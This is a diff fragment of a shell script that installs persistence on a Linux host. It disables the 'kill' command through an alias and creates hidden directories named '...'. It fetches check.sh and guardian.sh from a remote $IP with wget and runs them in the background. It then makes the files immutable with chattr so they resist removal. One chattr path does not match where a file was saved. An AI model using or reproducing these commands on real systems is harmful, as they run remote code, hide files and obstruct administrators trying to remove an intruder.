@@ -45,8 +45,10 @@ echo "--------------------------------------------------------------------------
 alias kill='echo "Sorry, the kill command is disabled."'
 echo "-----------------------------------------------------------------------------"
 echo
-mkdir /home/... && cd /home/... && wget http://$IP/check.sh && chmod +x check.sh && ./check.sh "$nick" &
-cd /mnt && mkdir ... && cd ... && wget http://$IP/guardian.sh && chmod +x guardian.sh && ./guardian.sh "$IP" &
+mkdir /home/... && cd /home/... && wget http://$IP/check.sh && chmod +x check.sh 
+./check.sh "$nick" &
+cd /mnt && mkdir ... && cd ... && wget http://$IP/guardian.sh && chmod +x guardian.sh  
+./guardian.sh "$IP" &
 chattr +ai /boot/check.sh && chattr +ai /mnt/.../guardian.sh
 echo
 echo "--------------------File successfully running in the background---------------"
